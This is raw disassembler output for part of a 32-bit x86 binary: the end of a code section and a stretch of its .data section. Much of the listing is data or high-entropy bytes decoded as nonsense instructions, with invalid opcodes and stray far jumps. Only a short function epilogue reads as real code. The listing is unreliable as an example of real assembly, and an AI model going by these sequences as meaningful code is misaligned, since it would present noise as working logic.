  4112b0:	lea    edi,[ebp-0x1b69959d]
  4112b6:	jno    0x4112d0
  4112b8:	mov    bl,0x75
  4112ba:	or     cl,BYTE PTR [eax+0x455ab7b1]
  4112c0:	jo     0x41131f
  4112c2:	popf   
  4112c3:	mov    ss,WORD PTR [edx]
  4112c5:	jns    0x411303
  4112c7:	sub    BYTE PTR [edi],0x20
  4112ca:	out    0x5e,eax
  4112cc:	repnz add DWORD PTR [eax+0x2fcecd27],ecx
  4112d3:	jmp    0xd511:0x390576b6
  4112da:	push   ds
  4112db:	jg     0x411300
  4112dd:	pop    esi
  4112de:	test   BYTE PTR [edi+0x7df79083],ch
  4112e4:	adc    al,0xb0
  4112e6:	fadd   QWORD PTR [ecx-0x13554869]
  4112ec:	sub    DWORD PTR [ebp+0x77],ecx
  4112ef:	cdq    
  4112f0:	xor    eax,0x8cf33a7
  4112f5:	test   BYTE PTR [ecx+eax*1],ch
  4112f8:	jae    0x41134c
  4112fa:	mov    bh,0xd8
  4112fc:	push   ds
  4112fd:	iret   
  4112fe:	shr    DWORD PTR [esi],cl
  411300:	int    0x9b
  411302:	shr    BYTE PTR [esi+0xb],cl
  411305:	outs   dx,BYTE PTR ds:[esi]
  411306:	mov    bl,0x61
  411308:	les    eax,FWORD PTR [edi]
  41130a:	fadd   DWORD PTR [ebp+0x188bb2dd]
  411310:	add    al,BYTE PTR [esi-0x5e]
  411313:	inc    esi
  411314:	sbb    DWORD PTR [ebp-0x1549bfba],eax
  41131a:	imul   esp,DWORD PTR [ebp+ecx*8-0x51ce53ac],0x9baec167
  411325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411326:	dec    eax
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	nop
  411355:	xlat   BYTE PTR ds:[ebx]
  411356:	fsub   st,st(7)
  411358:	dec    ebp
  411359:	inc    ebx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x411370
  411361:	icebp  
  411362:	loopne 0x411303
  411364:	aad    0x22
  411366:	and    al,0xc4
  411368:	mov    esi,0xfbe58e9c
  41136d:	mov    WORD PTR [edx+edx*4+0x3a],gs
  411371:	dec    ebx
  411372:	repnz add ebp,DWORD PTR [ebp-0x26]
  411376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411377:	jne    0x411308
  411379:	dec    ebp
  41137a:	xchg   DWORD PTR [ebx-0x14],edx
  41137d:	jb     0x4113e1
  41137f:	outs   dx,BYTE PTR ds:[esi]
  411380:	sbb    al,0x8d
  411382:	(bad)  
  411383:	lds    esp,FWORD PTR [ebx-0x6a]
  411386:	sbb    BYTE PTR [edi],bl
  411388:	mov    al,ds:0x36762ce8
  41138d:	popa   
  41138e:	jne    0x411320
  411390:	daa    
  411391:	cmp    ecx,DWORD PTR [edx]
  411393:	retf   
  411394:	sub    BYTE PTR [ecx],ah
  411396:	push   esp
  411397:	and    bl,ah
  411399:	outs   dx,BYTE PTR ds:[esi]
  41139a:	gs inc eax
  41139c:	push   esp
  41139d:	pop    esp
  41139e:	pop    esp
  41139f:	repz cwde 
  4113a1:	popa   
  4113a2:	mov    edx,ss
  4113a4:	ror    esi,0xe4
  4113a7:	push   edi
  4113a8:	fnstenv [edi-0x1c]
  4113ab:	mov    sp,0xc33e
  4113af:	cwde   
  4113b0:	mov    al,0x2b
  4113b2:	and    ah,BYTE PTR [esi+0x4744a312]
  4113b8:	dec    esi
  4113b9:	xchg   edi,eax
  4113ba:	jle    0x411423
  4113bc:	cmp    BYTE PTR [esp+eax*4+0x69557869],cl
  4113c3:	pop    esi
  4113c4:	pop    ds
  4113c5:	dec    esi
  4113c6:	xchg   ecx,eax
  4113c7:	cmp    eax,0x5424a070
  4113cc:	xor    eax,0x8e3655d6
  4113d1:	add    al,ah
  4113d3:	jl     0x4113d3
  4113d5:	lock jmp 0xf94c:0xbd41ac88
  4113dd:	inc    ecx
  4113de:	in     al,dx
  4113df:	sub    BYTE PTR [ecx+0x1e],dl
  4113e2:	fneni(8087 only) 
  4113e4:	jnp    0x41141e
  4113e6:	ror    BYTE PTR [edi],0x66
  4113e9:	dec    edi
  4113ea:	loop   0x4113cc
  4113ec:	(bad)  
  4113ed:	pusha  
  4113ee:	or     DWORD PTR [esp+ebp*2+0x33],edx
  4113f2:	mov    ah,0x90
  4113f4:	jl     0x411382
  4113f6:	mov    cl,dl
  4113f8:	(bad)  
  4113fa:	rol    DWORD PTR [eax-0x549755ca],0x24
  411401:	icebp  
  411402:	sub    eax,0xda97193b
  411407:	pop    ecx
  411408:	arpl   di,sp
  41140a:	ss stos BYTE PTR es:[edi],al
  41140c:	jmp    0x1c99d2b3
  411411:	xor    eax,0xb508e64c
  411416:	cmp    dh,BYTE PTR [ecx-0x3ba2506]
  41141c:	fisub  DWORD PTR [ebp-0x32]
  41141f:	jns    0x4113b0
  411421:	xchg   edi,eax
  411422:	fist   WORD PTR [eax-0x2a]
  411425:	das    
  411426:	in     al,dx
  411427:	push   es
  411428:	fsub   DWORD PTR [si-0x57ac]
  41142d:	mov    ds:0x257e24f0,eax
  411432:	stos   DWORD PTR es:[edi],eax
  411433:	sbb    esi,0x8b1f3348
  411439:	stos   DWORD PTR es:[edi],eax
  41143a:	rcr    DWORD PTR [ecx+eax*8-0x48],cl
  41143e:	fs cli 
  411440:	(bad)  
  411441:	fbstp  TBYTE PTR [edi-0x71fb605e]
  411447:	inc    ebp
  411448:	push   ss
  411449:	addr16 mov ch,0x8
  41144c:	mov    ecx,eax
  41144e:	cli    
  41144f:	dec    esi
  411450:	retf   0xcc08
  411453:	mov    ecx,0xd4349f5c
  411458:	push   ebp
  411459:	jmp    0x4113ff
  41145b:	xor    al,BYTE PTR [esi]
  41145d:	cwde   
  41145e:	push   edx
  41145f:	jl     0x4114b2
  411461:	sti    
  411462:	pushf  
  411463:	or     ecx,ecx
  411465:	(bad)  
  411466:	cmp    eax,0x2567a2f7
  41146b:	pop    ebx
  41146c:	addr16 mov eax,0xa1808104
  411472:	push   0xf
  411474:	sub    ecx,esi
  411476:	hlt    
  411477:	dec    esp
  411478:	push   es
  411479:	bound  edi,QWORD PTR ss:[edi+0x43]
  41147d:	or     DWORD PTR [edx+0x43],0x4b1a1c03
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx-0x45fffcc7],bh
  412425:	and    eax,DWORD PTR [ebx]
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
